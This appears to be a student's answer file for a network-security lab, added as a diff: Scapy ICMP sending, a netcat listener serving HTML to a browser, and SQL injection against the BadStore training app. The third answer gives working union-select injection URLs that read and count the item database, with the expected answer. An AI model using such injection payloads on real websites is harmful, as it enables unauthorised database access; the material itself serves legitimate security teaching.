@@ -1,0 +1,40 @@
+11]	  
+a.Demonstrate how to Send ICMP packets in Scapy and show the packet captured using Wireshark to destination 8.8.8.8.
+Ans:Open cmd prompt(normal)
+ Next,type pip install scapy  //(if not already installed)
+ Then type: scapy //hit enter
+ Type the following cmds below:
+>>> frame=Ether()/IP(dst="8.8.8.8")/ICMP()
+>>> frame //U will get this as output ..<Ether  type=IPv4 |<IP  frag=0 proto=icmp dst=8.8.8.8 |<ICMP  |>>>
+After that open wireshark and start capture,and come back to cmd prompt and type
+>>> sendp(frame) //capture the packet in wireshark...apply icmp filter and observe it
+
+-----
+b.Using NetCat, show communication between browser and the server (for an image).
+Ans:Go to seed vm ,open termial and type:
+  nc -vlp 1024 //shows the listening output
+Next, Go to browser and type: 127.0.0.1:1024 //hit enter
+Again come back to terminal….type:
+HTTP/1.1 200 OK
+Content-Type:text/html;charset:UTF-8
+Server:nooblinux
+
+<!doctype html>
+<title>trial</title>
+<h1>can u see me></h1> 
+<img src="image address"> // (do copy image location:its not possible in our systems..in lab it will work)
+
+(ctrl+c) //after this check the browser ..u can see the text of <h1> in the broswer and image
+    
+-----    
+c.How many items for purchase are in BadStore’s database? Use SQL injection on the quick search form field to find out.
+Ans:
+(answer : 16)
+On the search box , type any thing for example just x or type this:
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=x&action=search&x=11&y=9
+Next type this in search : 
+  Type the url:
+http://192.168.36.143/cgi-bin/badstore.cgi?searchquery=x%27+union+select+itemnum,+sdesc,+ldesc,+price+from+itemdb+--+&action=search&x=11&y=9
+We can count them manually or type this url:   
+    (type this final url enough ): 
+http://192.168.1.111/cgi-bin/badstore.cgi?searchquery=x%27+union+select+count%28itemnum%29%2Ccount%28itemnum%29%2Ccount%28itemnum%29%2Ccount%28itemnum%29+from+itemdb+--+&action=search&x=11&y=9
